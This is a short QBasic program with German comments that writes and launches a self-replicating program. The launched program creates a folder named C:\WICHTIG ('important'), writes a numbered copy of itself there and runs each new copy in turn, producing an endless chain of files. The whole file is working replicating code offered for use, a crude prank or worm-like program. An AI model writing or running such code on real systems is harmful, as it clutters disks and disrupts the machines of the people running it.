
'Erstellt Programm, das sich vermehrt, und l„sst es laufen. V1.0
'Alles im Verzeichnis C:\WICHTIG

OPEN "c:\programm.bas" FOR OUTPUT AS #1
OPEN "c:\programm.dat" FOR OUTPUT AS #2
a$ = CHR$(34)

PRINT #1, "MKDIR " + a$ + "C:\WICHTIG" + a$
PRINT #1, "CHDIR " + a$ + "C:\WICHTIG" + a$
PRINT #1, "CLS"
PRINT #1, "a$ = " + a$ + "100" + a$
PRINT #1, "LOCATE 12, 38: PRINT a$;"
PRINT #1, "OPEN " + a$ + "programm." + a$ + " + a$ FOR OUTPUT AS #1"
PRINT #1, "OPEN " + a$ + "C:\programm.dat" + a$ + " FOR INPUT AS #2"
PRINT #1, "LINE INPUT #2, q$"
PRINT #1, "PRINT #1, q$;"
PRINT #1, "PRINT #1, RIGHT$(STR$(VAL(a$) + 1), 3);"
PRINT #1, "PRINT #1, CHR$(34)"
PRINT #1, "FOR x = 1 TO 13"
PRINT #1, " LINE INPUT #2, q$"
PRINT #1, " PRINT #1, q$"
PRINT #1, "NEXT x"
PRINT #1, "CLOSE"
PRINT #1, "RUN " + a$ + "programm." + a$ + " + a$"


PRINT #2, "a$ = " + a$
PRINT #2, "LOCATE 12, 38: PRINT a$;"
PRINT #2, "OPEN " + a$ + "programm." + a$ + " + a$ FOR OUTPUT AS #1"
PRINT #2, "OPEN " + a$ + "C:\programm.dat" + a$ + " FOR INPUT AS #2"
PRINT #2, "LINE INPUT #2, q$"
PRINT #2, "PRINT #1, q$;"
PRINT #2, "PRINT #1, RIGHT$(STR$(VAL(a$) + 1), 3);"
PRINT #2, "PRINT #1, CHR$(34)"
PRINT #2, "FOR x = 1 TO 13"
PRINT #2, " LINE INPUT #2, q$"
PRINT #2, " PRINT #1, q$"
PRINT #2, "NEXT x"
PRINT #2, "CLOSE"
PRINT #2, "RUN " + a$ + "programm." + a$ + " + a$"
PRINT #2, "CLOSE"
CLOSE
RUN "c:\programm.bas"

